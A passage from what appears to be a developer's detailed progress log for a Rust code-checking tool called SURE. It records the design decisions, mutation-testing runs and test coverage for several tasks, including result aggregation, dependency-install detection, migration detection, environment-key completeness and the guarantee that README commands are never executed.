arrived byte-scrambled as `    test result: .ok` — the redirect that merged the run's two
output streams interleaved two writes inside one line. The catch count is read from
`test … FAILED` lines rather than from summaries, so a scramble cannot hide a catcher; and
that m18's 16 failures equal its 16 catchers is what says so for that row.

**`m22` reads five catchers in the committed run and six in run 2, and the sixth name is
not a catcher.** The extra name was `a_service_that_is_dropped_is_stopped_anyway`, which
lives in `crates/sure-core/tests/service_supervisor.rs` — a file that does not mention
`runtime_probes` at all, in a workspace where the module's only references outside its own
two files are `lib.rs` declaring it, one doc comment in `checks/node.rs` and a string
literal in `check_schedule.rs`'s proposer rule. `m22` removes the action from a probe
handed to a `PlanBuilder`, and `ProbePlan::of` has no caller in the shipped source yet, so
nothing that test does can reach it. `mutate3.py` counts every `test … FAILED` line in a
run without asking why it failed, so a test failing for its own reason inside a loaded
mutation run is counted as a catcher; that test is a timing test that spawns a Python
child and waits on a deadline, and this run is twenty-five consecutive full-suite runs on
one machine. It passes 5 of 5 when run alone afterwards, the committed tree's suite is
0 failed, and the run that measures the committed blob gives `m22` **five** again. The
number to read for `m22` is five, and the sixth name is recorded rather than dropped,
because a catch list is a count of failures and not a count of *caused* failures.

**The shape of the catch lists is worth a line of its own.** The widest is `m18` at 16,
then `m16` at 8 and `m22` at 5, then `m1` at 4; **ten of the twenty-five rows are caught
by exactly one test**, and there are **23 distinct catchers, 19 of which catch more than
one row**. The most widely used is
`a_probe_carries_the_weight_it_argues_for_and_nothing_louder` at 9 rows, and it is the
**sole** catcher of four of them — `m11` through `m14` — which is why the section above
says that test was written *before* the set was run: a test that closes four rows it was
not written for is doing work nothing else in the suite was doing.

**The survivor-marker trap bit again, and it is the same shape as the `gh --log` ANSI
trap.** `mutate3.py` runs as a subprocess without `PYTHONIOENCODING`, so its stdout is
encoded in this machine's locale and the em-dash in `(NONE — this mutation survived)`
reaches the log as two replacement bytes. A search for the marker **as written** finds
nothing, and a search that finds nothing reads exactly like a session with no survivors —
which is what it read as here until the ASCII word `NONE` was searched for instead, and
that is how `m20` and `m25` were found. **A matcher that matches nothing prints a
well-formed table of zeros**, and this is the second time on this branch that it has.

**Two commits, and the run of the first was green on the first push.** `c9057d7`
is 2271 insertions and 4 deletions across five files: the new
`crates/sure-core/src/runtime_probes.rs` at 1152 lines, the new
`crates/sure-core/tests/runtime_probes.rs` at 1071, four `pub(crate)` widenings
and three doc paragraphs in `checks/node.rs`, one line of `lib.rs`, and the
`check_schedule.rs` proposer rule's fifth entry — **the first entry on that list
that is not a submodule of `checks/`**. The module is a **composition layer above
the three proposers rather than a fourth one beside them**: it does not read a
manifest format, it asks `checks`'s own `node` proposer for a component's start
command and turns it into a check.

**Accepting `P5-T001` adds a READY entry rather than only removing one.**
`P5-T002` — *"Implement web/service start smoke check"* — names `P5-T001` and
nothing else, so this acceptance makes it READY. The READY list goes from seven
entries to eight, confirmed by `taskctl status` itself after the accept rather
than by a second reading of a replay: `P5-T002`, `P6-T001`, `P6-T005`,
`P6-T007`, `P8-T001`, `P12-T008`, `P13-T001`, `P13-T004`. The lowest-numbered is
`P5-T002`, and it is also the entry this task's own module is the input to —
which is convenient rather than decisive, because the rule is the lowest number
and not the tidiest story.

## What `P4-T009` added

**The one thing about `P4-T009` a reader should know before the detail: its
acceptance has two sentences and the second one is about this task's own tests
rather than about its behaviour.** *"Critical skipped/error/unknown is visible."* is
a claim about what a report built from a run can say. *"False-green unit tests
exist."* is a claim about what the tests have to prove, and it is answered by naming
**which** false greens — there are four, and each has a test that would go green if
the rule protecting it were removed. That second sentence is why two of the
twenty-four mutation rows below are described as *gaps the set found* rather than as
rows that passed.

**The module is the composition layer ADR 0010 implies and `FROZEN_SEMANTICS.md`
does not contain.** The frozen rule decides what a set of check results *means*.
Nothing in the domain decides **which results are in the set**, and the difference
is exactly where the false greens live.

**The rule was frozen before this module existed and not one part of it is
restated.** `sure_domain::status::aggregate` is the only aggregation entry point
(`docs/adr/0010-frozen-domain-semantics-in-code.md`) and `aggregation.rs` calls it:
no question about a failure, a skip or a warning is asked anywhere in the shipped
source. The severity, the blocking list and the coverage counts are the frozen
function's own answers, carried out unchanged. **Two rules hold that over the source
rather than over this paragraph**, and both are needed.
`the_aggregation_does_not_restate_the_frozen_rule` fails if `aggregation.rs`
contains `AggregateSeverity`, `match result.status` or `match check.status`.
`nothing_but_the_frozen_rule_builds_a_verdict` walks **every shipped source file in
the workspace** — every path under `crates/` containing `"src"`, read including its
`#[cfg(test)]` module — and fails if anything other than
`crates/sure-domain/src/status.rs` builds a verdict, because the first rule is only
as good as there being nowhere else for a verdict to come from, and **a source rule
over one file says nothing about the next file**.

**Two things the frozen rule cannot see, and both of them are false greens.**
`aggregate` answers one question about the slice it is handed; what it cannot see is
anything about **the set** rather than about a member of it.

- **A check the plan named for which no result came back.** The frozen function sees
  a shorter list and has no way to know a row is missing — and the same list without
  its failing check is not an incomplete run but a *different and greener* one. That
  cannot be closed inside a function whose input *is* the results, which is why there
  is a composition layer here rather than a wider `aggregate`.
- **Which kind of not-checked.** `CoverageSummary::critical_not_checked` is one list
  holding two states a reader acts on differently — `Skipped`, *"I was not allowed to
  look"*, and `Unknown`, *"I looked and could not tell"*. A report built from that
  one list cannot tell them apart. The vocabulary for the distinction already existed
  and **had no consumer in this crate at all** until this module: `CriticalState` is a
  five-way classification the domain froze on the wire and `CriticalState::from_status`
  classifies every row here, so the three states the acceptance names are the domain's
  own three and not a second set invented beside them. `CriticalState` still has no
  `as_str`, which is why `aggregation.rs` carries a private `const fn state_label`
  with no wildcard arm.

**The plan decides the run.** `CheckSchedule` is the authority on what the run
consists of: it decides the order rows come back in — the order `P4-T001` built the
plan in, which is the order every other report in this crate shows — and it is where
the entry for a check that did not run comes from, `ScheduledCheck::not_run`, which
by its own documentation can produce a skipped result for a check and **cannot**
produce any other status for one. `P4-T001` wrote that function for exactly this
caller, and until now it had none. Two rules follow, and together they are the whole
of what this module decides beyond calling the frozen function.

- **The aggregate is over the plan's checks and nothing else.** One entry per
  scheduled check in plan order, and a result for a check the plan never proposed is
  reported by `RunReport::unscheduled` and is **not** aggregated, so it can neither
  help nor hurt the verdict. That is `Enforcement`'s own rule one level up — a
  command for a check that is not in the plan is reported by `Enforcement::unscheduled`
  and not admitted — and it is also what stops an empty plan plus one stray passing
  result from reading green. `a_stray_result_cannot_make_an_empty_plan_green` is that
  case by itself.
- **The plan's decision is what happened.** A check the plan stopped that came back
  with a result claiming it ran is aggregated as the plan's stopped entry — a skipped
  result, which cannot be green — and its id is recorded by `RunReport::overruled`.
  Nothing is repaired and nothing is believed, **because the plan is what SURE was
  allowed to do and a claim to the contrary is a fact about the caller rather than
  about the project**. `m4` makes the claim win and `m5` records the ordinary case as
  though it were a claim; each is caught by exactly one test, which is the two rules
  being one rule apart.

**A missing row is synthesized, not invented.** `nothing_came_back` builds an
`unknown` `CheckResult` from the schedule's own stopped entry and the module's own
sentence (`const NOTHING_CAME_BACK`), which is enough to stop a green and is **not a
claim about the project**. That is the one place this module constructs a
`CheckResult` rather than passing one through, and it passes the plan's own check id
and title so the row is about the check the plan named.

**Deterministic is a property here rather than an adjective.** The report is a
function of the plan, the *set* of results and the project state, and the order a
caller collected the results in cannot reach the verdict — which is why the two
places it could, the order of the aggregated rows and the order of the reported
extras, are both decided here rather than left to a caller's loop.
`every_order_of_the_same_results_gives_the_same_report` feeds six results in **all
720 orders** and compares the reports. The extras are deliberately **two** rows
rather than one, because with one row the assertion would hold whatever order they
came back in — it would be a claim about membership wearing the words of a claim
about order — and `m17` would survive. **Nothing here reads a file, a clock, an
environment variable or a process**, and `the_aggregation_reads_nothing_but_its_arguments`
is the source rule that holds it, because "deterministic" is easy to write in a doc
comment and hard to keep.

**Two ways a caller is refused, and neither is repaired, because repairing either
would be the false green the rest of the module exists to prevent.** Two results for
one check: there is no honest rule for choosing between them, and inventing one —
first wins, or the least green wins — would be **new aggregation semantics living in
a composition layer**, which is the second place for a rule this repository keeps in
one. The check is named and no verdict is produced. A result established against a
different project state: every `CheckResult` names the state it applies to, and a
verdict that mixed two states would read a pass from an older tree as a pass about
this one, which is the stale pass `CheckResult`'s own documentation says both of its
required fields exist to prevent. **A refusal is not a green** — `RunRefused` has no
`is_green` and `RunReport` cannot be constructed without one of the two succeeding —
and `m20` makes the report's `is_green` answer `true` for a refusal, `m1` and `m2`
disable the two refusals, and `m3` makes the state refusal name the run's state
rather than the result's, which would leave the message unable to say what it found.

**The mutation set found two real gaps on its first run, and both are the kind of
thing the set exists for.** Twenty-four rows over the single source file this task
adds, **one row per decision rather than per syntactic accident**, empty test filter
on every row so a survivor is a mutation the whole crate's suite missed rather than
one a narrow filter never looked at. Run 1 — against the tree as first written — left
`m14` and `m24` **surviving with 0 tests catching each**.

- **`m14` looked like an equivalent mutant and is not, which is exactly why the set
  was worth running.** It deletes the early return in `detail_of` that reads a
  check's sentence from its `NotCheckedReason`. `CheckResult::not_run`
  (`crates/sure-domain/src/status.rs:353`) sets `reason` from
  `reason.plain_explanation()` itself at `:364`, so for every result built through
  that door the two agree and the row reads as unobservable. It is not:
  `CheckResult::with_reason` (`:405`) overwrites `reason` and **leaves
  `not_checked_reason` alone**, so the two fields are set independently and nothing
  keeps them equal — and `browser::Probe::verdict`
  (`crates/sure-core/src/browser.rs:672-680`) is a **shipped caller that does exactly
  that**, with `probe.rs:805-813` three more. Without the return, a user reading why a
  check did not run is shown whatever text the caller attached to the result instead
  of the sentence the product froze. Closed by
  `the_reason_a_result_carries_does_not_replace_the_sentence_for_a_check_that_did_not_run`.
- **`m24` was invisible because nothing asserted what either refusal *says*.** Both
  integration tests match the `RunRefused` variant and neither reads the `Display`. It
  is real for the same reason `m14` is: `RunRefused` reaches a caller as a `Display`
  and nothing else carries the difference, so a state refusal that reads as a
  duplicate sends a caller looking for a second result that does not exist. Closed by
  `each_refusal_says_which_refusal_it_is`. **The first draft of that test used only
  `assert_ne!` on the two messages, which would not have caught `m24`** — the swapped
  sentence still differs from the other — so the negative assertion
  (`!from_elsewhere.contains("more than once")`) is what catches the row, and the
  duplicate's phrase is asserted **positively as well as absent from the other**,
  because an assertion that only says *"not this phrase"* stops testing anything the
  moment a rewording drops the phrase.

**Run 2 was the full set again rather than the two rows**, so the log is one vintage
against the tree that was committed and there is no question of a row having been
measured against a different tree: **24 rows, 24 caught, 0 survivors, 0 inconclusive**,
every restore verified by blob hash (24 of 24 printed "restored to the pre-run blob"),
**44 result lines in every row** and `passed + caught = 1279` in every row. On the
re-run **each former survivor is caught by exactly one test, and it is the test
written for it** — the reading that says the closing test is the one doing the work
rather than a neighbouring assertion happening to cover it. The widest catch list is
`m13` at 10, then `m2` at 9 and `m23` at 7; **ten of the twenty-four rows are caught
by exactly one test**, and the risk that carries — a one-test row survives a reworded
or deleted test — is recorded in `progress/DECISIONS.md` rather than left implicit.
The tree the set measured is the tree that was committed, checked by hash rather than
assumed: every row of the re-run reports the same pre-run blob
`7ead0260b13d61476102551b29f9ca7cd5617c79`, and `git hash-object` on the committed
file gives that same value.

**The survivors were found by re-reading the log, not by re-running the set — and the
first reading of that log was wrong, which is the most reusable thing in this
section.** `mutate3.py` is run as a subprocess without `PYTHONIOENCODING`, so its
stdout is encoded in this machine's locale and the em-dash in
`(NONE — this mutation survived)` reaches the log as two replacement bytes. **A search
for the survivor marker as written finds nothing, and a search that finds nothing
reads exactly like a session with no survivors** — which is what it read as here
until the ASCII word `NONE` was searched for instead, and that is how `m14` and `m24`
were found. Same shape as the `gh --log` ANSI trap `cicheck.py` exists for: **a
matcher that matches nothing prints a well-formed table of zeros.** The rule that
follows is that a marker search has to be checked against a log known to contain one.

**Two rows were deliberately not written, and both are genuinely equivalent mutants —
which is a different thing from the two above.** `EvidenceClass::Unknown` in
`nothing_came_back` could be `DeterministicCheck` and no test could see it:
`CriticalCheck` carries no evidence class and `RunReport` does not re-export the
aggregate's counts by class, so the value is unobservable through everything this
task exposes. It is still the honest one — SURE has established nothing about a check
it never heard about — and the sentence for it lives in `NOTHING_CAME_BACK`, which
`m21` moves and one test catches. And the reported map could be a `HashMap` rather
than a `BTreeMap`: the claim it holds, that the extras' order is a function of the
ids, is asserted by `m17`'s row, which is the *observable* half. The container swap
is not, because with the two strays in the permutation fixture a `HashMap` would
*usually* answer in the other order and occasionally answer in the same one —
`RandomState` is seeded per process, so **the mutation would survive sometimes, and a
mutation that survives sometimes is worse than one that was never written**. The
assertion is mutated instead of the container.

**One stale comment was found and fixed, and it is the kind of defect no gate can
see.** `crates/sure-core/tests/aggregation.rs:861` opened the permutation test with
*"Five results, and every one of the 120 orderings of them"* directly above code
asserting `results.len() == 6` and `orderings.len() == 720`. The fixture was widened
from five results to six during design precisely so the extras' **order** is asserted
rather than only their membership — which is what makes `m17` catchable — and the
first sentence of the comment was not carried along with it. Found by reading the
test file's comments *against its code*, not by any gate, and the reason for the
sixth result is now written into the comment so the next reader does not narrow it
back.

**One thing the module found in a file it does not own, and deliberately did not
change.** `ScheduledCheck::not_run` records `NotCheckedReason::ExecutionNotAuthorized`
for every check the plan stopped, including one stopped because a **network**
permission was denied — and that reason's own sentence is about running the project's
code, so it is inaccurate for a network check. Changing it means changing
`schedule.rs`, which is `P4-T001`'s file and an accepted task's wording, and this
task's acceptance does not reach it. So the fixture was chosen so the sentence is
**accurate** — a `RunTests` check under inspect-only permissions — and the
observation is recorded in `progress/DECISIONS.md` rather than fixed quietly. It is a
real inaccuracy in a user-facing sentence and it is now written down rather than
lost.

**What the module does not do.** It does not run a check, choose a severity, build a
plan, or repair a disagreement. It has **no caller in this crate yet**, which is
`ProjectVerdict`'s own state one phase earlier — the seam is public and a later phase
wires it. It does not read the store, follow `P4-T008`'s lead and look at installed
state, or decide whether a result is *true*: it decides which results are in the set
and what the frozen rule says about them.

**File inventory, counted from the source rather than estimated.** The implementation
commit is 2012 insertions across three files: `crates/sure-core/src/aggregation.rs`
(857 lines = 530 shipped + a 328-line test module), the new
`crates/sure-core/tests/aggregation.rs` (1150 lines) and one line of `lib.rs`
(`pub mod aggregation;`, placed before `pub mod approval;` so the module list stays
alphabetical). **26 test functions were added**: 11 in the module's test module and 15
in the integration file. Nine of the eleven were in the first commit's tree; the other
two — the ones named against `m14` and `m24` above — were written after the first
mutation run. The passed delta and the nameset delta below both equal that source
count, which is the check that the count is real.

## What `P4-T008` added

**The one thing about `P4-T008` a reader should know before the detail: its
acceptance has two sentences and they pull in opposite directions.** *"Missing
dependencies are distinguishable from failing project code."* asks SURE to say
something about installed state; *"Install remains separate approved action."*
forbids SURE from doing anything about it. Three places in the repository forbid
looking at installed state at all — `docs/architecture/ECOSYSTEM_DISCOVERY.md`
argues that installed-ness must not influence what a project **is**, and
`checks/mod.rs` and `checks/rust.rs` both decline to carry an install step — so the
first sentence could only be answered by giving the reading a **different
subject**.

**Not *what is this project* but *what can SURE do with it right now*.** That is
the whole resolution. The question this module answers is a property of the **run**:
it changes between two runs over one unchanged commit, and it differs between two
people on one branch. That is exactly why it does not belong in a discovery result
— where a stale `node_modules` would change the project's identity and a fresh
clone would be a project SURE cannot classify — and exactly why it belongs beside
the check results it is used to read. Nothing is added to `Discovery`; the module
reads one and produces claims of its own.

**The rule that decides every verdict: a sentinel SURE met means nothing, and a
sentinel it did not meet over a walk that finished means one thing.** `met()` asks
the walk's **two** lists — `skipped()` and `entries()` — because `node_modules`
arrives as a `Skipped` and `.pnp.cjs` arrives as an ordinary `Entry`, and a rule
consulting only one of them would be silent about one kind of project.
`InstallState::of` is three-valued rather than two — `InPlace`, `NotInPlace`, and
`CannotTell` for a walk that did not finish — and only `NotInPlace` reads as
`Reading::TheDependencies`. The module never says the packages *are* installed, not
even when it finds the directory an install fills, because what is installed is the
package manager's answer: the directory can be stale, partial, or for a different
lockfile than the one in the tree. **Every way of being wrong in the presence
direction is silent** — a false sentinel suppresses a finding, and only a true
absence can produce one — so the direction of the error is chosen rather than
hoped for.

**The severity is argued from the frozen text rather than chosen: the claim is
`Severity::Note`.** `MustFix` is *"Do not recommend publishing or handing this
off."*, and a fresh clone of a healthy project is in exactly this state, so
`MustFix` would make SURE refuse to pass judgement on a project it has not been
able to check yet. `ShouldFixFirst` is *"A material reliability or quality
risk."*, which is the wrong **subject** as well as the wrong weight — the risk is
to SURE's ability to *measure* the project's quality and not to the project's
quality, and calling an environment fact a quality risk of the code is the precise
confusion this task exists to prevent. Two properties follow and neither is bolted
on: a `Note` cannot `blocks_hand_off`, and `can_alone_support_must_fix` is about an
evidence **class** rather than a level, so no missing package can become a
`must_fix` about somebody's code.

**The table has one row, and both omissions are argued rather than left as an
unfinished table.** Rust is out because there is no gap to find — `cargo test`
fetches what it needs when it runs, so an absent `target` is where the next command
writes rather than a state to fix first — and `checks/rust.rs` argues this at
length and declines to carry an install step for the same reason. Python is out
because absence settles nothing, and that is the more interesting omission: a
project without an installer gets `python -m pytest`, which the discovery itself
calls *"a command that depends on which interpreter is first on the path"*, and an
interpreter first on the path is not in the project — so a walk of the project
cannot see it, and a project with no `.venv` may have every one of its packages
importable. **The honest reason there is no Python row is that SURE cannot tell,
not that Python projects do not need installing.** The sentinel list is generous on
purpose and the generosity is the safety argument: this module's one productive
finding is an absence, so a sentinel missing from `resolved_into` is a project SURE
wrongly tells to install packages it already has, while a sentinel that should not
have been there costs a **suppressed** finding. So the row names `node_modules`
**and** Yarn's `.pnp.cjs`/`.pnp.js`, because a plug'n'play project resolves packages
with no `node_modules` at all — and that test is also the half that exercises the
walk's **entries** rather than its **skips**. **Only the root is read**, because
npm, yarn and pnpm hoist a workspace's packages into the root `node_modules`, and
the rule is equality with the root rather than a search under it.

**Nothing here installs and nothing here can be made to.** `Assessed::action` is
`ActionKind::InstallDependencies` — a **function** rather than a field, because
there is exactly one answer and a field would be a second place for it to be
written down wrong — and it is the value `ExecutionRequirements::of` turns into a
decision and `consent` turns into a question. What the module does **not** do is
compose the command: that is `crate::checks`' business and lives there, from the
same `ConventionalCommand` the checks are built from, and **the table has no column
for a command at all**, which is what makes that structural rather than a promise.

**One unit test was deleted rather than the guard widened to admit it, and that is
the decision this task most nearly got wrong.** `check_schedule`'s proposer rule
scans every shipped source file and fails when one names `ExecutionRequirements`
outside prose — and **it does not cut at `#[cfg(test)]`**, so a unit test in a
shipped file is a proposer for this rule. The first draft's unit test named
`ExecutionRequirements` to measure that inspect-only refuses an install; adding
`dependency_state.rs` to `MAY_PROPOSE` would have weakened a real guard and
asserted something false about a module that proposes nothing, and the test was
redundant because the integration test already makes the same claim over a real
`Assessed`. Its one missing assertion moved into
`an_install_is_a_separate_action_that_needs_its_own_permission`. **The tree was
green on the first push after that change and not before it**, and the failure was
a guard working correctly rather than a defect.

**Two mutations were considered and deliberately not written, because both are
equivalent mutants no test in this suite could see.** The
`.unwrap_or(row.declared_in)` fallback in `evidence_of` is unreachable from a table
whose `resolved_into` is non-empty, and reversing the `resolved_into` traversal in
`Dependencies::met` changes nothing because no fixture has two sentinels present at
once. **A survivor that means nothing is worse than a row that was never written**,
and the *answers* both rows would have moved are held by name elsewhere. That is
the equivalent-mutant finding arriving for the third task running, and the third
time the answer was to not write the row at all. One row, `m10`, removes the case
fold from the sentinel lookup and is **platform-dependent in the way `P4-T007`
recorded for its own `m13`**: observable on this machine's case-insensitive
filesystem and exercised on the other by CI, where the same code path answers the
opposite way — and the test that catches it asserts whichever answer the platform
gives, so it is caught on both rather than only here.

**What this task does not do, stated where the module states it.** It does not
install anything, and it never composes the command that would; it does not read a
manifest to find out what the packages *are*, only whether the walk met the place
an install would have put them; it does not decide whether a project's declared
packages are the right ones, or current, or resolvable; and it does not look inside
a dependency tree it finds — a `node_modules` that exists is the end of the
question rather than the beginning of one.

## What `P4-T007` added

**The one thing about `P4-T007` a reader should know before the detail: its
acceptance has two sentences and the first is the one that shaped the module.**
*"Framework-specific detectors are pluggable. Mandatory missing-migration fixture
can be detected."* A `Detector` is a row of four constants — the file that says a
framework is in use, the path it keeps its record at, the predicate that decides
what counts as a migration, and the framework's name — and `look`, `count_under`
and `assess` name no framework anywhere, so adding one is writing a row rather than
editing a rule. **Both halves are held by tests that use a framework SURE does not
ship**: `a_detector_sure_does_not_ship_is_used_without_touching_any_shipped_code`
detects one from a table the test declares, and
`a_framework_sure_does_not_ship_is_detected_over_real_files` does it again against
a real walk of a real directory.

**The rule that decides every verdict: a gap is a claim only where the shape is
and the record is not.** A framework is in play when the file that says so is in
the walk; its record is what is under the path the convention names.
`Record::Holds(n)` for `n > 0` produces **no claim at all** — the report is silent
about that framework, because a project with migrations is not a finding — while
`Record::Empty` and `Record::Absent` each produce one and are never the same claim.
An empty record is `MustFix`; an absent one is `ShouldFixFirst`, and the reason is
the module's own sentence rather than a comment: **a project that has never written
its first migration and a project whose record was lost or never made look the same
from here**, and `prisma init` writes exactly the first of those.
`FROZEN_SEMANTICS.md` reserves `MustFix` for a finding that blocks a hand-off
*alone*, and a finding whose own sentence hedges cannot do that. `m5` and `m6` move
one severity each — that pair is the argument this task makes, and a set holding
only one of them would leave it untested in the other direction.

**The one thing a later task has to know, recorded rather than left to be
discovered: `evaluation/acceptance-manifest.json` expects `must_fix` for
`missing-migration`, and this check reaches it through the *present-and-empty*
shape.** The fixture app and the check therefore have to agree on which shape
`must_fix` names. `fixtures/adversarial/missing-migration/` and the conformance
test that pins the fixture-expectation type are **`P14`'s**, so this task
demonstrates detection with fixtures of its own and does not reach into them; both
shapes are held here by integration tests, so whichever way `P14` resolves the
correspondence, the behaviour it is resolving *about* is pinned. **The cost of
changing the choice:** moving `Absent` up to `MustFix` would make every
freshly-initialised project block a hand-off, and moving `Empty` down would make
the acceptance fixture unreachable.

**The detectors are paths, and the table has no column for a declared
dependency.** Prisma, Drizzle and Diesel are not in the discovery tool tables at
all, so such a column would never fire for them; Alembic **is**, and reading the
file is still the rule for it, because a table that named some frameworks and not
others would be one rule for the projects SURE already knows and another for the
rest. It is also the stronger rule for the case this product exists for: a project
an AI assembled from a snippet has the config file and never added the package to
its manifest, so a manifest-driven detector would answer *no framework here* about
exactly the project most likely to have the problem.

**The module reads nothing, and one of the tests says so about the source rather
than about the behaviour.** Every rule takes `&[Entry]` — the walk's own list —
rather than a `Scan`, which is affordable only because a scan already holds every
path under a directory it entered. `the_module_opens_no_file` reads
`db_migrations.rs`, cuts at `#[cfg(test)]`, and fails if `std::fs`, `fs::read`,
`read_to_string`, `File::open`, `OpenOptions` or `BufReader` appears on a line that
is not prose. **It is written that way because "this stage does not open files" is
a claim about the source, and a behavioural test can only sample it.** The
`&[Entry]` signature is also what makes the unit tests possible at all: `Scan`'s
fields are private and there is no `Scan::for_test`, so the first draft — which
took `&Scan` — could not have been tested below the integration level. The case a
path is looked up by is `CaseSensitivity::platform()` rather than the case the
caller chose for the walk, because the question is whether two names are the same
**file**; `lookup_key` moves from `pub(super)` to `pub(crate)` so the folding rule
stays written once, and the test that holds it is gated
`#[cfg(not(any(windows, target_os = "macos")))]` rather than `not(windows)` —
`CaseSensitivity::platform()` folds macOS with Windows, so the narrower gate would
have run the case-*sensitive* assertion on a platform that answers
case-*insensitively*.

**What this task does not do, stated where the module states it.** It does not run
a migration, a schema tool or a database; it does not read a manifest to find out
whether the framework's package is a declared dependency; and it does not decide
whether a project's migrations are *correct*, only whether a project that has a
schema has a record of how the database reached its shape. `P4-T007` is the first
use of `AnchorSubject::Database` in the crate.

## What `P4-T006` added

**The one thing about `P4-T006` a reader should know before the detail: its
acceptance sentence has two halves and the second one is answered by an
*absence*.** *"Missing key/documentation mismatches are reported without
requiring secret values."* The pass reads which keys a project's source files ask
the environment for and which keys its example files and documents name, and
reports every key only one side knows about as a claim with a verdict, a
severity, a reason and an anchor per place it was found. **No anchor carries an
excerpt** — the module contains no call to `with_excerpt` at all — and that is
the whole of the answer to the second half. `EvidenceAnchor` has one field that
exists to hold the text a claim was read from, and **the line a key is read on is
the line a value is on**: `process.env.API_KEY = "…"` is one line, so an excerpt
here would be a credential. There is nothing to redact because nothing is quoted,
which is a stronger promise than a redaction step can make, and
`every_anchor_is_empty_of_excerpts` holds it against every claim a fixture can
produce rather than against the arms somebody remembered.

**One file was added and one line of `lib.rs`, and the module that reads was not
touched.** `crate::references` already answers the two-list question and already
declines to conclude from it — its own documentation says the lists *"are not a
claim about the project unless the reading was complete"* — so
`crates/sure-core/src/env_completeness.rs` takes a `ReferenceReport` and returns
claims, and the whole of this task is that file plus `pub mod env_completeness;`.
The split is `P4-T005`'s, arriving unchanged, and for the same reason: an anchor
is only worth having if the hand that writes it is the hand that knows what was
read, so the layer that issues verdicts is the layer that holds the
`FingerprintId` — and a caller who wanted the key lists for a display that
settles nothing still gets lists.

**The verdict rule is one sentence — a one-sided key is a claim only if the
reading finished — and the reading is asked once for the whole report.** `assess`
takes `complete` and `unread` as parameters rather than looking them up, because
both are facts about the reading and not about the key. A finished reading gives
`Confirmed` *as worded*: that a source file asks for the key **and** that no
example file or document names it, both halves things SURE read. An unfinished one
gives `CannotConfirm` **with an empty evidence vector** and a reason that names
what went unread — a file and its path, or, when there is no unread file and the
report is still incomplete, the walk, which is the only other thing `is_complete`
weighs. An anchor on a claim SURE could not settle would be evidence for nothing.
**Nothing here is ever `Contradicted`**, and that is a property of the subject
rather than a gap: a contradicted claim is one the *project* made and SURE
refuted, and an undeclared key refutes nothing — no file says it is documented, so
there is no statement for the finding to be the opposite of.

**Severity follows the side that is missing, and the highest it reaches is
`ShouldFixFirst`.** A key read but named nowhere is `ShouldFixFirst`; a key named
but read nowhere is `CanFixLater`, because *"no source file SURE read asks for
it"* is a statement about SURE's reading — a key can be read by a shell script, a
container file, a build configuration or a language SURE does not read, and the
reason sentence says so rather than concluding the key is unused. **Neither
reaches `MustFix`**, which `FROZEN_SEMANTICS.md` reserves for a finding that
blocks a hand-off on its own. `the_severity_follows_the_side_that_is_missing` is
what holds that, over every claim in a fixture that produces both sides.

**The keys a machine provides are named in one public constant, and a key on it
is still reported.** `PROVIDED_BY_RUNTIME` holds **53** names — `PATH`, `HOME`,
`NODE_ENV`, the Windows known-folder variables, `CARGO_HOME`, `VIRTUAL_ENV`, the
`GITHUB_*` set a CI machine sets — and the list is deliberately **exact rather
than a prefix rule**, because a reader asking why `GITHUB_SHA` is set aside and
`GITHUB_TOKEN` is not has no way to find that out from a name, and `PATH_TO_DATA`
and `NODE_ENVIRONMENT` are a project's own keys that a substring rule would
swallow. Matching is case-insensitive because Windows gives one environment to
every process regardless of the case a program asks in; where the two rules could
disagree the answer is *set aside*, since the cost is one finding not made against
the cost of every Windows run reporting `Path`. **A runtime key still becomes a
claim** — `Severity::Note`, reachable through `set_aside()` — so a person sees the
key and SURE's judgement about it, and `plain_description` counts them instead of
filtering them away.

**Two smaller decisions worth naming because they are the ones a reader would
otherwise have to infer.** An evidence list is cut at `MAX_ANCHORS = 8` and the
sentence says when it was cut — *"SURE found 30 places on this side of the
comparison and anchors the first 8"* — and `m7`, which removes the condition on
that sentence, is caught by three tests. And `plain_description` leads with both
side counts, so a report with no claims cannot read the same for *every key
matches* and *there were no keys*; `a_project_that_names_nothing_says_so` is the
test that makes the difference visible. **The module is deliberately not
registered in `crate::checks`** — `P4-T005` set that precedent, and registering a
pass in `schedule.rs` is a decision about the plan rather than about the check.

**What this does not establish, stated where the module states it.** It does not
read `.env`: `crate::references` opens a `.env`-family file only when its name
marks it a template, and this module reads no file of its own — the file the
values are in is not opened, not parsed and not reported unread. It does not know
what a key is for, so it cannot say a key is spelled the way a consumer spells it
nor that an unread key is unused. And it does not look for a key anywhere but the
two sides: a key mentioned in a `Dockerfile` is neither a read nor a declaration,
which is `crate::references`'s scope arriving here unchanged.

## What `P4-T005` added

**The one thing about `P4-T005` a reader should know before the detail: its
acceptance is two sentences, and the second one is a claim about what the code
*contains* rather than about what it does.** *"Arbitrary README shell text is not
blindly run."* The pass this task adds reads every documented command and every
documented path in a project's Markdown and turns some of them into claims about
what the project declares — and **runs nothing**. Not behind a timeout, not with a
confirmation, not at all. The module that decides the claims,
`crates/sure-core/src/setup.rs`, builds no `Command`, names no `ProcessRequest` and
names no `Supervisor`, and the three rules in `crates/sure-core/tests/spawn_sites.rs`
are what hold that — `setup.rs` is on none of their exemption lists. **The
acceptance sentence is therefore checked at the level of the source**, because a
test that ran the pass and watched nothing happen could not tell *nothing was run*
from *the fixture never parsed*. `the_documented_command_left_no_trace_and_was_still_read`
writes a document whose shell text would create a file in each platform's dialect
(`touch canary-from-bash`, `New-Item canary-from-powershell`), runs the pass, and
asserts at once that the tree is unchanged, that neither canary exists, **and** that
SURE's own sentences never quote the command — the third assertion being the one
that makes the first two mean something.

**Two files were added and two were extended, and the extension to
`crates/sure-core/src/documents.rs` is larger than the new module.** The pass has
one reader, because the byte budget, the unread accounting and the walk are the
same for both kinds of claim and two passes over one file are how two readings of
one document come to disagree — so the whole path-reading half of `documents.rs`
(`DocumentedPath`, `PathForm`, `DocumentReport::paths()`, the link and code-span
readers) is new here, and `setup.rs` is what asks the filesystem about what that
reader found. **A command and a path are both markup, and that is what makes them
one decision**: the fence is the author saying *this is something you run*, and the
backtick or the link is the author saying *this is something in the project*. Paths
are read from the lines **outside** every fence, so the two lists cannot both claim
a line, and a path written in prose is not read at all — there is no markup saying
which noun is a path, and SURE does not pick.

**The first sentence names three things — a claim, a path, a script — and the
module's most consequential decision is the fourth thing it refuses to answer.**
A documented command becomes a claim only when `script_from` can read it as a
package manager running a named script: `npm run build`, `npm run-script build`,
and npm's four shorthands `test`, `start`, `stop` and `restart`. A line with a
pipe, a wildcard, an assignment or a shell variable in it becomes **no claim at
all** rather than a claim of unknown status, because reading `foo | bar` as *the
manager running the script `|`* would be an inference about a line that is a
program. A documented path becomes a claim when Markdown puts it in a link target
